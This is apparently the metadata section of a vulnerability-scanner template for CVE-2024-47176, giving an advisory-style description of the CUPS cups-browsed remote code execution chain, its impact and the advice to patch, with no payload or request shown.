id: CVE-2024-47176

info:
  name: CUPS - Remote Code Execution
  author: princechaddha
  severity: high
  description: |
    CUPS is a standards-based, open-source printing system, and cups-browsed contains network printing functionality including, but not limited to, auto-discovering print services and shared printers. cups-browsed binds to INADDR_ANY-631, causing it to trust any packet from any source, and can cause the Get-Printer-Attributes IPP request to an attacker controlled URL.
    Due to the service binding to *-631 ( INADDR_ANY ), multiple bugs in cups-browsed can be exploited in sequence to introduce a malicious printer to the system. This chain of exploits ultimately enables an attacker to execute arbitrary commands remotely on the target machine without authentication when a print job is started. This poses a significant security risk over the network. Notably, this vulnerability is particularly concerning as it can be exploited from the public internet, potentially exposing a vast number of systems to remote attacks if their CUPS services are enabled.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary code on the target system.
  remediation: |
    Apply the necessary patch or upgrade to a non-vulnerable version of CUPS.
